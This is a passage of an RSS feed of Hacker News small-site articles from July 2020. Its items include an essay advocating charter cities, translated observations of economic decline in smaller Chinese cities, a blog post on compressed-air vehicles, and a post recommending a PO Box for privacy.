<p>Most transformer models have three inputs: <code>input_ids</code>, <code>token_type_ids</code> and an
<code>attention_mask</code>. The first is the token sequence for input and in this case is
the combined sequence of tokens …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.vespa.ai/introducing-nlp-with-transformers-on-vespa/">https://blog.vespa.ai/introducing-nlp-with-transformers-on-vespa/</a></em></p>]]>
            </description>
            <link>https://blog.vespa.ai/introducing-nlp-with-transformers-on-vespa/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23733854</guid>
            <pubDate>Sat, 04 Jul 2020 18:01:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We Need More Charter Cities]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 3 (<a href="https://news.ycombinator.com/item?id=23733605">thread link</a>) | @rchaudhary
<br/>
July 4, 2020 | https://www.ciceroinstitute.org/post/charter-cities | <a href="https://web.archive.org/web/*/https://www.ciceroinstitute.org/post/charter-cities">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><h6>Written by <a href="https://twitter.com/JTLonsdale">Joe Lonsdale</a></h6><h6>‍<a href="https://twitter.com/JTLonsdale">@JTLonsdale</a></h6><h6><a href="https://twitter.com/JTLonsdale">Twitter</a> |&nbsp;<a href="https://www.linkedin.com/in/JTLonsdale/">LinkedIn</a></h6><p>‍</p><p>Over the last few centuries, most of our world has become incredibly prosperous relative to the past. When entrepreneurs compete to offer better goods and services, good ideas "win" and spread. Older, less effective ways of doing things wither and die. As basic research and scientific breakthroughs advance what's possible, entrepreneurs with ambitious visions introduce new and better ways of doing things. In an open society with a market system, each of us is incentivized to learn from what works and creatively solve problems for each other. This is why our economy continues to grow, and goods and services continue to improve over time.									</p><p>As the world’s economy has grown more and more dynamic, governments haven’t kept up. Competition has destroyed many lumbering corporate bureaucracies; government bureaucracies have only grown. Automobile speed, safety, and reliability have increased by countless orders of magnitude since the invention of the Model T Ford; the time it takes government to build needed infrastructure has skyrocketed. Decades of innovation in infotech and logistics have brought us just-in-time supply chains and efficient procurement. Government procurement in America hasn't kept up with these best practices because it lacks transparency, incentives, and accountability. One example - out of thousands - that is particularly salient and frustrating today is that the US government spent millions on a contract for in- case-of-emergency ventilators that were never delivered even as COVID-19 became a national crisis. It’s obvious that the forces tied to our growing prosperity haven’t trickled over to public policy.&nbsp;</p><p>I am an American patriot and continue to spend much of my career helping to fix the government we have. Thousands of governments work with software companies I have founded such as OpenGov, Esper, and Palantir, which help better allocate trillions of taxpayer dollars, bring data and transparency to the regulatory state, or use cutting-edge technology to enable new workflows to achieve public policy goals and save billions of dollars compared to how things were done before. We’re proud to have partnered with extraordinary people in government to achieve great things. But fixing government from the inside is not enough; American government is too big and too entrenched in outmoded processes and only loosely accountable to the American public.&nbsp;</p><p>This is why I’m attracted to the concept of “charter cities”: legally independent city-states, or “special economic zones” which are free to innovate and establish better modes and methods of government than existing players. We should combine the lessons from the past century with new technologies to improve transparency, hold public servants accountable, and make government work better. The best way to drive innovative governance is for governments or aspects of governments to compete for citizens just as companies compete for customers. Governments must constantly innovate, respond to changing circumstances, and invent or adopt better ways of doing things – or else lose out to competitors.&nbsp;</p><p>I support the work of Patri Friedman at Pronomos Capital, Mark Lutter at the Charter Cities Institute, Balaji Srinivasan, and others in the space on the conviction that the concept of a charter city is revolutionary. Layers and layers of bureaucracy, lack of accountability, and other mistakes have enabled cost disease and crony capitalism in critical sectors, reduced the dynamism of our economy, and made the cost of living skyrocket for our middle and working classes. We need a revolution in governance.&nbsp;</p><figure id="w-node-bd55c1be8db6-b3e175bd"><p><img src="https://assets.website-files.com/5ef37c99b43a6fc5f535692d/5effaad138630803dbfb48b7_FRAME_03_v04_HD.jpg" alt=""></p><figcaption>(An example of a charter city set in rural America. Renders by The Cicero Institute / Joe Lonsdale)</figcaption></figure><p>It’s difficult for human beings to understand the idea of positive-sum growth. Intuitively, anything my neighbor gains is a loss for me. In one sense, that’s true. As Nobel prize-winning economist Paul Romer explains, the world of physical objects - or collections of atoms - is finite and zero-sum. Any&nbsp;object I obtain is a loss for you and vice versa. So how is positive-sum growth possible? Ideas. Good ideas rearrange the world in ways that make the things in it more valuable.&nbsp;</p><p>The practice of farming, for example, didn’t create new atoms even as it dramatically expanded the food supply. It was a good idea that changed the world to make it more useful, allowing humanity to support a larger population at less cost. Bad ideas do the opposite. Soviet collectivized farms, for example, cost millions of lives.&nbsp;</p><p>Markets are positive-sum because good ideas are valuable. If I buy something from you, I’m telling you that I value what you’ve made. If you make a profit, it means you’ve increased the value of whatever raw supplies you started with. If you make a loss, you’ve destroyed value. A free market without cronyism is a machine that increases the value of the world by rewarding good ideas and punishing bad ones. When ideas compete, we all win because the best ideas change the world in ways that make all of us more prosperous.&nbsp;</p><p>Some of the most powerful ideas find expression in our laws and shape the actions of entire communities. The best collections of ideas - such as the United States constitution or English common law - don’t just change the physical world but establish frameworks within which people may act. Good laws make for a more prosperous society. Bad laws, such as those in Venezuela or North Korea, can have disastrous effects on everyone.&nbsp;</p><p>Unfortunately, governments improve more slowly than individuals and corporations because they face much less competition and their citizens have little choice. When a company does things badly, consumers punish it by buying a competitor’s product. But if your government taxes you to pay for something that's wasteful or inefficient, you can’t respond by not paying taxes. You can try to help design and support a more efficient version of the scheme, but politics, unlike markets, are not generally a place where the best ideas win or where the relevant ideas are even discussed. Ultimately, bad policies reduce economic growth and decrease tax revenues, but this takes years or decades, and government today is such a giant kludge of disparate aspects that it’s hard to tell which policies were at fault.&nbsp;</p><p>In theory, people can always move from one country to another. One might think that the threat of political “exit” would force countries to compete for citizens just as companies compete for customers - and to some degree this does happen at extremes. Countries with better laws attract more citizens and tax revenue and prosper over time [such as net inflow into the US]. Countries with bad laws lose population and power [such as Venezuela]. But there are serious barriers to political exit. It’s time- consuming and expensive to move, and it’s sometimes difficult to get permission to enter a new jurisdiction. Further, many countries have distinct advantages - such as tremendous natural resource endowments - that shelter them from the consequences of mismanagement. Finally, the best countries attract talented individuals who themselves attract others, and though laws make a difference over the long-run, network effects can persist for a long time even when beset by poor government.&nbsp;</p><figure id="w-node-a693ac26f297-b3e175bd"><p><img src="https://assets.website-files.com/5ef37c99b43a6fc5f535692d/5effab5f6dc9fca333884f6f_FRAME_01_v03_HD.jpg" alt=""></p><figcaption>(Set in rural America. Renders by The Cicero Institute / Joe Lonsdale)</figcaption></figure><p>Charter cities are new cities, founded on unpopulated land [we are lucky - the vast majority of land is still open!], which are allowed autonomous commercial law and semi-autonomous governments and justice systems. The idea is simple: found new cities, free from old bureaucratic and legal structures, and explore bold new visions of how government should work. Market them to people who choose to join and see what the world learns.&nbsp;</p><p>Charter cities must attract new residents to survive. This is a powerful incentive to make laws clear and fair, build responsive public institutions, provide economic opportunity, and come up with new ideas to outcompete incumbent competitors. There’s no one way to achieve these ends, so charter cities will also compete with each other to design and implement innovative governance regimes.&nbsp;</p><p>We know that competition in government works because it’s been done before. The United States, for example, is prosperous in part due to a federalist system that forces each state to compete as a laboratory of democracy within a federal framework that makes it easy to move from state-to-state. 1846, for example, New York became the first state to fully abolish rules for corporate charters under which corruption was rampant because the legislature used to decide which businesses were allowed to incorporate. Over the latter half of that century, this measure spread from state to state and became ubiquitous.&nbsp;</p><p>Of course, the biggest success stories come from the most radical experiments. Over the course of a century, Hong Kong developed from a standard port city into one of the most prosperous cities in the world - even as mainland China stagnated under communism. Good laws made Hong Kong wealthy. The Chinese, recognizing this, set up in 1980 a special economic zone in the Shenzhen area nearby where some normal economic restrictions were waived to more closely resemble Hong Kong. The area grew by more than an order of magnitude in population and prosperity in the first 20 years of its existence. Deng Xiaoping’s special economic zone experiments were the basis for China’s gradual liberalization. By showing what kinds of laws attract capital and commerce, Hong Kong and Shenzhen transformed all of China.&nbsp;</p><p>The most successful charter cities will likely guarantee and protect individual liberties, have a fair legal system with clear and just laws and decisions based on precedent, and treat businesses and workers fairly with a transparent regulatory structure. These features have made several small cities like Hong Kong and Singapore …</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.ciceroinstitute.org/post/charter-cities">https://www.ciceroinstitute.org/post/charter-cities</a></em></p>]]>
            </description>
            <link>https://www.ciceroinstitute.org/post/charter-cities</link>
            <guid isPermaLink="false">hacker-news-small-sites-23733605</guid>
            <pubDate>Sat, 04 Jul 2020 17:19:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sub Tier 1 China (2016)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23733336">thread link</a>) | @satvikpendem
<br/>
July 4, 2020 | https://www.adoracheung.com/sub-tier-1-china | <a href="https://web.archive.org/web/*/https://www.adoracheung.com/sub-tier-1-china">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

      
<p>Even with so much<span></span> <span>“</span>the sky’s falling in China” rhetoric, you’ll still find a lot of optimistic, forward-looking people here. But there’s a stark contrast between attitudes in Beijing/Shenzhen/etc and sub-tier 1 cities that urbanization has seemingly left behind.</p>
<p>Below are observations Chinese millennials made when they visited their hometowns during this year’s Spring Festival week (aka Chinese New Year). These were shared on Wechat a bit (unknown who original curator is). I thought it’d be interesting to translate and re-share here.</p>
<h3 id="observation-of-a-tier-4-chinesecity">Observation of a Tier 4 Chinese&nbsp;city</h3>
<ol type="1">
<li>As local coal mines goes from reducing and suspending production to filing bankruptcy, their workers are first delayed and denied wages before being laid off.</li>
<li>The local real estate market is stagnant. Ongoing construction projects are left unfinished. Completed property don’t sell.</li>
<li>Local cigarette factories see their sales over the past year go into decline and begin to cut production.</li>
<li>Food and fruit princes drop. So does the income of farmers.</li>
<li>More labor sitting idle and less income for workers.</li>
<li>Infrastructure construction continues to go strong. The business at a local stone supplier to road construction projects is flourishing.</li>
</ol>
<p>Reflection:</p>
<ol type="1">
<li>The energy sector, including coal and oil, and real estate sector are the first to be affected by the economic crisis. The situation continues to deteriorate, with no optimistic outlook.</li>
<li>The reach of the economic crisis is expanding to more sectors. Even cigarette companies, which have enjoyed high profit margin, are suffering. The management pins the blame on the restriction on consumption using public funds. The restriction has been in place for a number of years, its impact is already evident from the plummeting stock prices of white liquor or baijiu manufacturers. However, during all these years, the margin of cigarette industry has remained stable. An article published last year even said that the cigarette industry was the most lucrative business in China. Therefore, what is going on in local cigarette companies is related to local economy and local income.</li>
<li>The revenue decline of coal mines and cigarette factories, which used to be local cash cows, will trigger a series of consequences and affect the overall local consumption level. As a result of layoffs and shrinking demand, local spare labor force has grown. The income of local workers has declined due to an oversupply of labor.</li>
<li>Infrastructure construction is the only sector holding up while coal mines, local consumption and real estate are suffering. Considering the backwardness of the local infrastructure, this sector still has room to grow, as long as investment is in place. But where does the money come from? Local government is already heavily in debt. It all comes down to how much the central government is willing to support.</li>
</ol>
<h3 id="observation-of-a-chinese-county-known-fortourism">Observation of a Chinese county known for&nbsp;tourism</h3>
<ol type="1">
<li>Local automobile part factories and steel plants close down.</li>
<li>Heavy polluter chemical industry is doing fine, but production is limited.</li>
<li>Advertisement agencies are doing alright.</li>
<li>Plenty of car sales were made at the second half of 2015, with many new cars spotted on the road.</li>
<li>Tourism industry has declining sales.</li>
</ol>
<h3 id="observation-of-jimo-a-county-level-city-in-shandongprovince">Observation of Jimo, a county-level city in Shandong&nbsp;Province</h3>
<ol type="1">
<li>Economy seems to be really struggling. Several large local clothes OEMs are faced with the risks of closing down. Making money is becoming increasingly difficult. So is collecting receivables.</li>
<li>Sales are difficult to make in the real estate sector.</li>
<li>Quality commercial property is needed.</li>
<li>Retail sellers on Wechat are everywhere. Overseas shopping agents are on Wechat. People go on the platform to sell designer handbags from local OEMs, clothes and even vegetables and honey. It is the absolute trend. Wechat public accounts have penetrated almost every industry. For example, by following the Wechat public account of a karaoke place, people can order and switch songs on their phone. An extremely popular local account is Zhang Shang Ji Mo, a local fusion of portal website, meituan and 58.com. It is said that even some villages have their own public accounts on Wechat.</li>
<li>Taxi hailing apps are highly popular.</li>
<li>Traffic congestion is serious.</li>
<li>Smog is serious in winter, but no one cares about the level of <span>PM</span> 2.5. No one on the street wears masks even when <span>PM</span> 2.5 level shoots over 300.</li>
<li>Gyms have recently begun to grow. Whether you are a worker, a small business owner or a civil servant, everyone loves iPhone, but many of those over 40 years old use Huawei or even Oppo phones.</li>
<li>Red packets on Wechat are all the rage.</li>
</ol>
<h3 id="huainan-city-in-anhuiprovince">Huainan city in Anhui&nbsp;Province</h3>
<ol type="1">
<li>This is an energy-sector driven city. Coal usage in power plant has plummeted. The majority of coal mines have halted production and given workers unpaid leaves.</li>
<li>Few consumers at restaurants and entertainment venues.</li>
<li>Local economy is gloomy.</li>
</ol>
<h3 id="a-county-district-under-a-tier-3city">A county (district) under a tier 3&nbsp;city</h3>
<ol type="1">
<li>Many private loans have gone bad. Many borrowers have gone into hiding, which has affected companies that have backed each other’s loans.</li>
<li>Many small factories have suspended production.</li>
<li>Bank lending and secured loan have almost stopped. <span>NPL</span> ratio at local rural credit cooperatives and agriculture banks is estimated to increase substantially.</li>
</ol>
<h3 id="a-tier-4-city-in-northeastern-china">A tier 4 city in Northeastern China</h3>
<ol type="1">
<li>Factory: private steel plants have cash flow problems. Workers have not yet received their January wages.</li>
<li>Shopping mall: shopping has apparently declined.</li>
<li>Real estate: housing prices in premium locations are doing <span>OK</span> while prices in non-premium locations are down by 25%.</li>
</ol>
<h3 id="a-tier-1.5-city-in-northwestern-china">A Tier 1.5 city in Northwestern China</h3>
<ol type="1">
<li>Employees of state-owned enterprises have seen their salaries cut, benefits cancelled and workload slightly increased.</li>
<li>Restaurant and tourism industry has gloomy performance. Many restaurants and luxury hotels in tourist attractions are closed. The number of foreign tourists has shrunk.</li>
<li>Housing prices have fallen to 1,000–3,000 <span>RMB</span> per square meter.</li>
</ol>
<h3 id="a-tier-4city">A Tier 4&nbsp;city</h3>
<ol type="1">
<li>real estate construction is suspended and many migrant workers are returning to their hometowns.</li>
</ol>
<h3 id="taiyuan-shanxiprovince">Taiyuan, Shanxi&nbsp;Province</h3>
<ol type="1">
<li>Many new roads are built.</li>
<li>Salary at large state-owned enterprises is cut in half to around 3,000-over 5,000 at steel plants and around 2,800 at bus companies.</li>
<li>No progress made regarding Internet +</li>
</ol>
<h3 id="taizhou-zhejiangprovince">Taizhou, Zhejiang&nbsp;Province</h3>
<ol type="1">
<li>One-third shoe factories are closed. Business is difficult.</li>
<li>Private lending chain is disrupted. Many have fled.</li>
<li>Downturn of the tertiary industry, for example, restaurant and entertainment, has accelerated.</li>
<li>Local government begins to have fiscal problems. It is said that Wenling, a county-level city, is over 100 million <span>RMB</span> in deficit.</li>
</ol>
<h3 id="luoyang-henanprovince">Luoyang, Henan&nbsp;Province</h3>
<ol type="1">
<li>Luoyang, which used to be a city of heavy industry, is doing quite a good job with transformation.</li>
<li>Tourism is developing well.</li>
<li>Traditional media are transforming successfully, with many cultural events held. The Internet culture is booming. Local people have strong willingness to spend money and their buying power has been greatly enhanced.</li>
</ol>
<h3 id="tangshan-a-tier-3city">Tangshan, a Tier 3&nbsp;city</h3>
<ol type="1">
<li>Very few construction related electrical works and real estate projects are starting.</li>
<li>Quite a few steel plants have been closed, of which a few have not paid its workers. It is expected that half of the largest steel plants will be closed in the upcoming year.</li>
<li>Cotton and corn prices are down year-on-year.</li>
<li>Not many orders are received by machinery factories. Workers work for a few days before being put on leave again.</li>
<li>Not many customers are spotted in shopping malls.</li>
</ol>
<h3 id="a-prefecture-level-city-in-centralchina">A prefecture-level city in Central&nbsp;China</h3>
<ol type="1">
<li>Government offices are moving outwards. Downtown area continues to be the most densely populated place. The old town has serious traffic congestion problem.</li>
<li>There are at least five large shopping centers under construction.</li>
<li>It is common for one family to own two cars and three apartments/houses. Most apartments/houses are empty. There is not enough migrant population. It’s difficult to collect rent.</li>
<li>Most parents hope that their children can come back home after finishing university. They think it is better to be a civil servant at home than to work outside their hometown.</li>
<li>Business at Internet cafes and cinemas is good, better than at restaurants.</li>
<li>Many business owners go into hiding or commit suicide.</li>
<li>Prices are high, but doing business is hard. Very few people use Didi taxi app. The taxi market is chaotic. An increasing number of people are getting double eyelid surgery or eye surgery to treat myopia.</li>
</ol>
<h3 id="a-village-in-northern-jiangxiprovince">A village in northern Jiangxi&nbsp;Province</h3>
<ol type="1">
<li>Many cars are running are the street, causing traffic congestion.</li>
<li>Rural children receive low level of education.</li>
<li>Many people run away after borrowing from private lenders.</li>
<li>To get married in the county, one needs to have an apartment and a car.</li>
<li>Mahjong is very popular.</li>
<li>In a high school union, it is found that those who come from the county settle back down in the county and those from the village are now migrant workers in Beijing, Shanghai, Guangzhou or Shenzhen.</li>
</ol>
<h3 id="a-village-in-northern-jiangsuprovince">A village in northern Jiangsu&nbsp;Province</h3>
<ol type="1">
<li>The housing market is cooling. Urban planning changes as policy-makers change their mind. Many farmers are not very willing to invest in the stock market as the government encourages them to. Housing prices in the county have fallen.</li>
<li>Local soil is heavily polluted. There have been more cancer patients. Rivers in the county are also heavily polluted.</li>
</ol>
<h3 id="lankao-henanprovince">Lankao, Henan&nbsp;Province</h3>
<ol type="1">
<li>The economic development here is pretty fast. Companies like Foxconn, <span>GEM</span> (Green Eco-Manufacturer) and Hangxiao Steel Structure are either building or have already built factories here. The local government is even able to select which company they would like to have here. Foxconn alone provides 22,000 jobs. There are companies there are listed on the new <span>OTCBB</span> and even to be listed on the main board. A high-speed rail will soon be in operation in the upcoming year. A sewage system that separates rainwater from wastewater is also under construction.</li>
<li>There are clearly more private cars than before. It is estimated that at least half are low and …</li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.adoracheung.com/sub-tier-1-china">https://www.adoracheung.com/sub-tier-1-china</a></em></p>]]>
            </description>
            <link>https://www.adoracheung.com/sub-tier-1-china</link>
            <guid isPermaLink="false">hacker-news-small-sites-23733336</guid>
            <pubDate>Sat, 04 Jul 2020 16:33:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Who killed the air-powered vehicle?]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23733299">thread link</a>) | @HermanMartinus
<br/>
July 4, 2020 | https://herman.bearblog.dev/air-powered-vehicle/ | <a href="https://web.archive.org/web/*/https://herman.bearblog.dev/air-powered-vehicle/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div><h2>Compressed air is a sustainable alternative to batteries and fossil fuels. Despite this, it has been disappearing from the public eye.</h2>
<p>I first became interested in compressed air as a fuel source during a visit to The Hartebeesthoek Radio Astronomy Observatory (HartRAO) during a cub-scout camp many years ago. We made rockets out of Coca-Cola bottles pumped up with a bicycle pump; makeshift fins held on with cello-tape. After a brief pumping the pent-up energy overcame the nozzle’s friction, the bottle-rocket would detach from the pump, and would blast off into space.</p>
<p>Alternative forms of energy storage have always been fascinating. From <a href="https://en.wikipedia.org/wiki/Pumped-storage_hydroelectricity"> pumped hydroelectric energy storage</a> to <a href="https://en.wikipedia.org/wiki/Flywheel_energy_storage">flywheel energy storage</a> . I recently stumbled upon this article on Low-Tech magazine about <a href="https://solar.lowtechmagazine.com/2018/05/ditch-the-batteries-off-grid-compressed-air-energy-storage.html"> compressed air energy storage (CAES)</a> . It rekindled my interest in using compressed air as a way to conserve power, overcoming the <a href="https://en.wikipedia.org/wiki/Duck_curve"> duck’s head problem</a> of some sustainable energy production techniques like solar and wind power.</p>
<p>The concept of CAES is fairly simple: compress air while there is energy production (the sun is up) for later use. The flow of energy can then be turned up or down depending on the demand by increasing or decreasing the flow of air.</p>
<p>Larger-scale CAES plants are fairly inefficient since compressing air generates heat (the second law of thermodynamics) and decompressing air cools it down significantly. Due to this, we will not be talking about CAES for large scale power storage, but for powering vehicles. Specifically, the humble bike.</p>
<p>A compressed-air vehicle is fuelled by tanks of pressurised atmospheric gas and propelled by the release and expansion of the gas within a pneumatic motor. These vehicles are comparable to battery-powered vehicles, with energy generation being displaced from the vehicle itself to a power plant where lower source emissions are possible and the net production of pollutants can be reduced.</p>
<p>The energy is stored in a pressurised tank on the vehicle which can be refilled or swapped out (hypothetically) at service stations, or refilled by plugging an onboard compressor into the electricity grid. Compressed air in 300 bar containers has energy density comparable to lead-acid batteries.</p>
<p>There have been few examples of compressed air vehicles in history such as the Gottardbahn pneumatic locomotive and <a href="https://en.wikipedia.org/wiki/Fireless_locomotive"> Fireless locomotives</a> .</p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/0/07/CompressedAirLocomotive_Section1_AdolpheBraun1811to1877.jpg" alt=" Gotthardbahn"></p>
<p>Torpedos have also been known to use compressed air as a propulsion mechanism.</p>
<h3>What makes pneumatic vehicles interesting?</h3>
<p>The sounds of a city are the sounds of traffic. During the first week of lockdown was the first time I had ever heard a truly quiet city. The sounds of vehicles dominate the soundscape of cities. A city without internal combustion engines would be a much more peaceful place to live.</p>
<p>The cost of building pneumatic bikes are potentially much smaller than both internal combustion and electric motorbikes due to the simplicity of their design and the lack of special materials required in their construction. Lest we forget, internal combustion engines work by carefully exploding fuel and directing the explosions in a useful way.</p>
<p>Compressed-air vehicles are comparable in many ways to electric vehicles in their advantages but without the need for environmentally hazardous chemicals such as gasoline or battery acids/metals. Cylinders also do not need to be changed out every few years like electrochemical batteries and have a much longer operational life due to the simplicity of their structure.</p>
<p>The rate of self-discharge is very low when compared to batteries that deplete their charge slowly over time. Therefore, the vehicle may be left unused for longer periods than electric alternatives.</p>
<p>These cylinders can be swapped out at filling stations easily or charged while parked using solar power or done at home by hooking it up to the electrical grid.</p>
<p>Due to social distancing measures taken in big cities such as London and Paris, cycling for transport has spiked again, with new cycle-only paths and roads becoming the norm. Having personal vehicles as opposed to taking public transport will be standard for the foreseeable future while we deal with this pandemic.</p>
<h3>There are some downsides</h3>
<p>Any conversion of energy between forms results in a loss. For compressed-air cars, energy is lost when electrical energy is converted to compressed air, and when that stored energy is converted into kinetic energy to turn the motor.</p>
<p>When air expands it cools dramatically. This energy loss could be used for something, but for now let’s just assume that it is lost to the atmosphere on an air-powered motorbike. Similarly, tanks get very hot when filled rapidly. SCUBA tanks can be immersed in water to cool them while being filled, but this also results in energy loss.</p>
<p>Refuelling a compressed air container at home may take as long as 4 hours, while refilling on specialised equipment may fill the tank in 3 minutes while dealing with the excess heat in some (hopefully productive) way.</p>
<p>The final issue with CAES for propulsion is that while batteries can somewhat maintain their voltage throughout their discharge, the pressure of compressed air tanks falls as the air is released, effectively providing less propulsion over time.</p>
<h3>Experimental cars and bikes</h3>
<p>For this article, we will be focussing specifically on bikes, as there are a few problems with air-powered cars as the power necessary to propel a car is vastly greater than the amount necessary to propel a bike. While the majority of the energy required for driving a car is used in moving the car itself, the inverse is true for a bike where an air propelled bike would likely weigh half of the weight of the rider.</p>
<p>There have been a whole host of functional prototypes for bikes running on nothing but compressed air. The <a href="https://web.archive.org/web/20110218141158/http://www.ecofriend.org/entry/eco-bikes-green-speed-air-powered-motorcycle-aims-to-smash-land-speed-record/"> Green Speed Air Powered Motorcycle</a> using the Angelo Di Pietro compressed air engine made some noise in 2009.</p>
<p><img src="https://inhabitat.com/wp-content/blogs.dir/1/files/2012/11/o2-pursuit-final_363-600x480.jpg" alt="O2 Pursuit"></p>
<p>In 2011 the <a href="https://www.coroflot.com/deanbenstead/O2-Pursuit-Prototype"> O2 Pursuit Prototype by Dean Benstead</a> boasted a range of 100km per tank and top speeds of 140km/h, using a modified Yamaha WR250R and also using EngineAir’s Angelo Di Pietro motor. It even won a <a href="https://newatlas.com/2012-james-dyson-award-finalists/24630/"> James Dyson award</a></p>
<p>There have been multiple successful engineering projects. Some built by engineering students, some by hippies or handymen at home. <a href="https://bikeportland.org/wp-content/uploads/2016/03/pneu-Cory-lead-ted-800x789.jpg"> Cory Little</a></p>
<p>Even Peugeot, Suzuki, Toyota, and Tata had some form of air-powered vehicles in the works.</p>
<h3>Then things go silent</h3>
<p>My research on pneumatic vehicles took me on nostalgia-inducing trips through the “old internet” of personal blogs, unmaintained news sites, and enthusiast journals. There were a LOT of broken links as web pages were removed over the years, domains expired, and server fans stopped spinning.</p>
<p>Around 2012 talk about pneumatic and air-powered vehicles goes quiet. The plans of releasing some promising pneumatic motorbikes to the public seems to completely disappear. Toyota, Tata, Peugeot and Suzuki (as far as I can tell) abandon their plans to release air powered vehicles. <a href="https://en.wikipedia.org/wiki/AIRPod"> 1</a> <a href="https://www.lesechos.fr/2015/01/psa-la-revolution-de-lhybrid-air-naura-pas-lieu-190742">2</a></p>
<p>I’m generally not a conspiracy theorist, but I believe that air-powered vehicles may have been suppressed (see what I did there). The technology is sound, and if prototypes built by engineering students can work well enough, imagine what could happen if a well-funded company developed an air-powered motorbike.</p>
<p>Maybe there’s something I don’t know about. Maybe the tech is actually a lot more complicated than I am led to believe, but that still leaves the question: Who killed the pneumatic bike?</p>
</div>
</div></div>]]>
            </description>
            <link>https://herman.bearblog.dev/air-powered-vehicle/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23733299</guid>
            <pubDate>Sat, 04 Jul 2020 16:27:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You Need a PO Box]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23733223">thread link</a>) | @jetgirl
<br/>
July 4, 2020 | https://jetgirl.art/2020/07/04/you-need-a-po-box/ | <a href="https://web.archive.org/web/*/https://jetgirl.art/2020/07/04/you-need-a-po-box/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	<section id="site-content-posts">

		
<article id="post-1547">

<!-- .site-title --><img width="580" height="371" src="https://jetgirl.art/wp-content/uploads/2020/07/elizabeth-kay-9szCcOw4BWo-unsplash-580x371.jpg" alt="" srcset="https://jetgirl.art/wp-content/uploads/2020/07/elizabeth-kay-9szCcOw4BWo-unsplash-580x371.jpg 580w, https://jetgirl.art/wp-content/uploads/2020/07/elizabeth-kay-9szCcOw4BWo-unsplash-300x192.jpg 300w, https://jetgirl.art/wp-content/uploads/2020/07/elizabeth-kay-9szCcOw4BWo-unsplash-1024x655.jpg 1024w, https://jetgirl.art/wp-content/uploads/2020/07/elizabeth-kay-9szCcOw4BWo-unsplash-768x491.jpg 768w, https://jetgirl.art/wp-content/uploads/2020/07/elizabeth-kay-9szCcOw4BWo-unsplash.jpg 1200w" sizes="(max-width: 580px) 100vw, 580px"><!-- .post-author --><p>Date: July 4, 2020</p><!-- .post-date --><!-- .post-categories -->




<p><em>Because bacon takes forever to cook I’m writing this entire thing from the kitchen. Make your jokes accordingly. </em></p>



<p>The number one suggestion I see for people trying to get a following for their newly written book, program, etc is to start a newsletter. Here in the US at least that has some rules that go along with it. Sure, you can start a newsletter with a few dozen folks, send an email each month and not end the world. However, if you want to set up a real email service you’ll need to add something to the very end of it, your address. <a href="https://www.ftc.gov/tips-advice/business-center/guidance/can-spam-act-compliance-guide-business">Legally in the US you have to put both a real working unsubscribe link and a real live address. </a>Mailchimp, Substack, and Tinyletter all have this built in when you set up your profile the address you put in gets added automatically. </p>



<p>You don’t want to put your physical home address on the wilds of the internet. I’m sure someone out there has your credit card info in a txt file along with your real address, but what we’re worried about is the 99.9999% of other folks out there who don’t need extraordinarily easy access to that info. Not everyone has a work office address either. </p>



<p>Is a PO Box expensive? Depends on the size of box. The smallest one at my Post Office is about $6.25 a month, just a dollar over what I pay for my web hosting. Not so bad is it? Typically they charge in blocks of 3, 6 , or 12 months and send you little reminders that your account is about to get charged, no shady business with the USPS. I haven’t bought one of the boxes from UPS or other commercial mail services but I’m sure they are similar. </p>



<p>Did I get a PO Box just for a newsletter? No, I originally got it to connect to my Ham radio information. When I got my license I had planned on buying some cool equipment and connecting to other hams and doing what’s called DXing and swapping QSL postcards after making contact. I<a href="https://en.wikipedia.org/wiki/QSL_card">t’s a super old custom but really cool. </a>Unfortunately I don’t’ have the hardware to do it just yet but maybe someday. </p>



<p>So I kept the PO Box. Luckily I had discovered fountain pens and with fountain pens come the excuse to use them on things like, you guessed it, writing letters. I found a few penpals on a subreddit but like most things there the letters dried up after two or three responses. It’s hard to keep in touch when either recipient gets busy. But it was nice to have a PO Box to let a stranger send me letters as opposed to handing out my real address. </p>



<figure><img src="https://jetgirl.art/wp-content/uploads/2020/07/tareq-ismail-HEisQPDi_H8-unsplash1-1024x576.jpg" alt="" srcset="https://jetgirl.art/wp-content/uploads/2020/07/tareq-ismail-HEisQPDi_H8-unsplash1-1024x576.jpg 1024w, https://jetgirl.art/wp-content/uploads/2020/07/tareq-ismail-HEisQPDi_H8-unsplash1-300x169.jpg 300w, https://jetgirl.art/wp-content/uploads/2020/07/tareq-ismail-HEisQPDi_H8-unsplash1-768x432.jpg 768w, https://jetgirl.art/wp-content/uploads/2020/07/tareq-ismail-HEisQPDi_H8-unsplash1-1536x864.jpg 1536w, https://jetgirl.art/wp-content/uploads/2020/07/tareq-ismail-HEisQPDi_H8-unsplash1-580x326.jpg 580w, https://jetgirl.art/wp-content/uploads/2020/07/tareq-ismail-HEisQPDi_H8-unsplash1.jpg 1920w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Photo by <a href="https://unsplash.com/@tareqismail?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Tareq Ismail</a> on <a href="https://unsplash.com/?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></figcaption></figure>



